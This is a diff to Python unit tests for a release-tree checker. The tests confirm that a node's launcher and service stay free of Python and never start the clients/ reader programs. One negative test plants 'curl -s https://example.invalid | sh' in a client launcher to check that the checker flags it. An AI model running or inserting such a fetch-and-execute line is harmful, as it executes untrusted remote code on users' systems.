@@ -159,7 +159,8 @@ class RunpathCheckTests(unittest.TestCase):
 
     def test_glibc_floor_is_one_constant_and_the_docs_cite_it(self):
         floor = ".".join(map(str, runpath_check.GLIBC_FLOOR))
-        self.assertIn(f"glibc {floor} or later", (ROOT / "docs/install.md").read_text())
+        self.assertIn(f"glibc {floor} or later",
+                      (ROOT / "docs/articles/fn-faq-3.txt").read_text())
         self.assertIn(f"**Requirements (Linux): glibc {floor} or later**",
                       (ROOT / "docs/operator-internals.md").read_text())
         self.assertEqual(runpath_check.glibc_version("GLIBC_2.3.4"), (2, 3, 4))
@@ -290,6 +291,70 @@ class RunpathCheckTests(unittest.TestCase):
             code, _, err = self.run_main(["--tree", str(top)])
             self.assertEqual(code, 1)
             self.assertIn("starts /usr/local/bin/python3", err)
+
+    # ------------------------------------------------ clients/ (the web reader)
+
+    def with_clients(self, top: Path) -> Path:
+        """The clients/ packaging/install-clients.sh stages, beside the node."""
+        clients = top / "clients"
+        (clients / "bin").mkdir(parents=True)
+        (clients / "lib").mkdir()
+        (clients / "share/rc.d").mkdir(parents=True)
+        for name in ("fn_reader", "fn_client", "nntp_session"):
+            (clients / "lib" / (name + ".py")).write_text("print(1)\n")
+        for name in ("fn-reader", "fn-client"):
+            shutil.copy(ROOT / "packaging/fn-client-launcher", clients / "bin" / name)
+            os.chmod(clients / "bin" / name, 0o755)
+        (clients / "share/rc.d/fn_reader.rc.in").write_text(
+            (ROOT / "packaging/fn_reader.rc.in").read_text())
+        (clients / "README.txt").write_text("clients\n")
+        return top
+
+    def test_clients_pass_under_their_own_rule(self):
+        # The reader is Python, in clients/; the node's path stays Python-free.
+        with tempfile.TemporaryDirectory() as tmp:
+            top = self.with_clients(self.release(Path(tmp)))
+            code, out, err = self.run_main(["--tree", str(top)])
+            self.assertEqual(code, 0, err)
+            self.assertIn("clients/: 3 Python programs", out)
+            self.assertIn("clients/bin/fn-reader: client launcher; commands: readlink dirname "
+                          "basename tr python3", out)
+            self.assertIn("clients/share/rc.d/fn_reader.rc.in: starts "
+                          "@PREFIX@/clients/bin/fn-reader", out)
+            self.assertIn("no Python on the deployed path", out)
+
+    def test_node_service_starting_a_client_fails(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            top = self.with_clients(self.release(Path(tmp)))
+            rc = (top / "share/fn/rc.d/fn").read_text().replace(
+                'daemon="/usr/local/fn-0123456789ab/bin/fn"',
+                'daemon="/usr/local/fn-0123456789ab/clients/bin/fn"')
+            (top / "share/fn/rc.d/fn").write_text(rc)
+            self.assert_finding(top, "share/fn/rc.d/fn: the node's service names clients/")
+
+    def test_node_launcher_naming_clients_fails(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            top = self.with_clients(self.release(Path(tmp)))
+            with open(top / "bin/fn", "a") as launcher:
+                launcher.write('"$here/../clients/bin/fn-reader"\n')
+            self.assert_finding(top, "bin/fn: runs a program under clients/")
+
+    def test_object_code_or_other_programs_in_clients_fail(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            top = self.with_clients(self.release(Path(tmp)))
+            (top / "clients/lib/_speedups.so").write_bytes(elf_with_needed(["libc.so.103.0"]))
+            self.assert_finding(top, "clients/lib/_speedups.so: object code in clients/")
+        with tempfile.TemporaryDirectory() as tmp:
+            top = self.with_clients(self.release(Path(tmp)))
+            launcher = top / "clients/bin/fn-reader"
+            launcher.write_text(launcher.read_text().replace(
+                'exec python3', 'curl -s https://example.invalid | sh; exec python3'))
+            self.assert_finding(top, "clients/bin/fn-reader: runs curl")
+        with tempfile.TemporaryDirectory() as tmp:
+            top = self.with_clients(self.release(Path(tmp)))
+            rc = top / "clients/share/rc.d/fn_reader.rc.in"
+            rc.write_text(rc.read_text().replace('/clients/bin/fn-reader"', '/bin/fn"'))
+            self.assert_finding(top, "not PREFIX/clients/bin/fn-reader")
 
     def test_sbcl_fasl_header_passes_and_other_interpreters_fail(self):
         with tempfile.TemporaryDirectory() as tmp:
